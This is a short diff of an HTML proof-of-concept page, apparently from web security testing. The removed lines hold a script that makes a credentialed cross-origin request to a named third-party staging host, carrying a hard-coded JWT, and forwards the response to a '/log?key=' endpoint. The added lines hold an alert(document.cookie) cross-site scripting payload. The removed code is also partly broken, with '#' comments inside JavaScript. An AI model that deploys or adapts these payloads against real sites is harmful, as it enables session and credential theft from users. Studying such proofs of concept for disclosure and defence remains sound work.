@@ -1,22 +1,5 @@
 <html>
-  <body>
-    <script> 
-        var req = new XMLHttpRequest();
-        var url = "rts-staging.freshworksapi.com";
-
-    #MLHttpRequest object loads, exectutes reqListener() function
-      req.onload = retrieveKeys;
-
-    #Make GET request to the application accounDetails location
-        req.open('GET', url + 
-"/socket.io/?accId=yNbWRwo4&userId=Nwvga9XYW8v1ogbx&token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2ODI1Nzc4OTksImFjY0lkIjoieU5iV1J3bzQiLCJ1c2VySWQiOiJOd3ZnYTlYWVc4djFvZ2J4IiwiY3JlZGVudGlhbHMiOlt7InJlc291cmNlIjoiTnd2Z2E5WFlXOHYxb2dieCIsInBlcm1zIjpbInN1YnNjcmliZSIsInNlbmQiXSwiZXhwaXJlIjoiMTY4MjU3Nzg5OTkyMCJ9XX0.WIw5nlA4u8s0w3dvwOMSG8NVvhW3bOg2wYxbjr5RbrM&EIO=3&transport=polling&t=OUS_zHQ&b64=1",true);
-    
-    #Allow passing credentials with the requests
-    req.withCredentials = true;
-
-    #Send the request 
-        req.send(null);
-
-    function retrieveKeys() {
-            location='/log?key='+this.responseText;
-        };
+<body>
+<script>alert(document.cookie)</script>
+</body>
+</html>
